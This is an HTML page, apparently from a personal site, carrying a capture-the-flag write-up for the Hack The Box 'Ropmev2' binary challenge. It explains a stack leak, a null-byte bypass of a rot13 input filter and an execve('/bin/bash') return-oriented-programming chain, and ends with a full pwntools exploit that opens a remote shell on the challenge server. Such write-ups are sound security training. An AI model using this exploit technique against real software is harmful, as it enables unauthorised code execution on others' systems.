@@ -1,0 +1,102 @@
+<div class="page-header">
+    <div class="page-header-inner">
+        <div class="page-header-inner2">
+            <h1>PWN/Ropmev2 - Hard</h1>
+            <h2>August 2021</h2>
+            <h4>rot13'd payload + execve(/bin/bash,0,0)</h4>
+        </div>
+    </div>
+</div>
+<H4>Problem</H4>
+<div class="paragraph">
+    <p>
+    rop me if you can
+    <br>
+    </p>
+</div>
+<H4>Solution</H4>
+<div class="paragraph">
+    <p>
+    	This challenge gives us a binary to download and develop the exploit for locally, and then an address to connect to remotely and retrieve the flag from using the developed exploit.
+        <br><br>
+    	The main function is fairly short. If we give it 'DEBUG' as our input, it gives us a stack leak and calls main again. Unfortunately NX is enabled, so we cannot just ret2shellcode. This does however means that we do not need to search libc for a '/bin/sh\0' string and can instead just store it on the stack. Additionally the binary has 'syscall' and a 'pop rax' gadgets, so we can instead just opt for an execve('/bin/sh\0',0,0) rop chain. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/hackthebox/ropmev21.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        We have our exploit planned, but there is another hurdle we need to take into account. Before main returns, the filter() function is executed. This function loops through our input and then rotates it by 13. This would have made writing our exploit a lot more uncomfortable, however luckily for us, this stops on a nullterminator. This means that we can add a nullterminator early on in our payload and completely bypass this entire check. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/hackthebox/ropmev22.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        Storing '/bin/sh\0' on the stack, and setting up execve('/bin/sh',0,0) works locally to spawn a shell, however remotely we just get the message 'LOL NOPE' back. As it turns out, on remote /bin/sh has been disabled. This was an extremely random and unnecessary restriction in my opinion that added absolutely nothing to the challenge since we could instead just execute /bin/bash. <br><br>After replacing /bin/sh with /bin/bash and adjusting the padding accordingly, our exploit also worked on remote and could be used to spawn a shell and retrieve the flag. The full exploit is posted below. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/hackthebox/ropmev29.png" alt="">
+</div>
+<div>
+    <style 
+        type="text/css">
+            pre code {
+                      background-color: #008080;
+                      border: 1px solid #999;
+                      display: block;
+                      padding: 15px;
+                      color:  #F5F5DC;
+                    }
+    </style>
+    <pre>
+        <code>
+#!/usr/bin/env python
+
+from pwn import *
+elf = context.binary = ELF('./ropmev2')
+libc = elf.libc
+
+local = False
+
+if local:
+    p = elf.process()
+else:
+    host = '46.101.23.188'
+    port = 32408
+    p = remote(host,port)
+
+debug  = b'DEBUG'
+p.sendline(debug)
+
+p.recvuntil('is ')
+leak = int(p.recvline().strip()[3:],16)
+print(hex(leak))
+
+pop_rdi = p64(0x40142b)
+pop_rsi_r15 = p64(0x401429)
+pop_rdx_r13 = p64(0x401164)
+pop_rax = p64(0x401162)
+t = b'T'*8
+syscall = p64(0x401168)
+binsh = p64(leak - 0xd8)
+
+payload = p64(0x0) + b'/bin/bash\0' + b'A'*198 + pop_rdi + binsh + pop_rsi_r15 + p64(0x0) + t + pop_rdx_r13 + p64(0x0) + t + pop_rax + p64(0x3b) + syscall
+
+p.sendline(payload)
+
+p.interactive()
+        </code>
+    </pre>
+</div>
+<br><br>
+
+<script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
